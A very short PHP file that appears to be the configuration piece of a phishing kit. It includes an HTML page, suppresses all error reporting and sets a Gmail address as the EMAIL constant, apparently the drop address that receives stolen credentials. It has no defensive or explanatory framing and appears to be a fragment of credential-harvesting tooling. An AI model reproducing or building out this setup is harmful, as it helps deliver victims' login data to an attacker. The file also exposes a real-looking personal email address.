<?php
include('direct.html');
error_reporting(0);
$ur_email   = "goldbello123@gmail.com
";
define("EMAIL", "$ur_email");
?>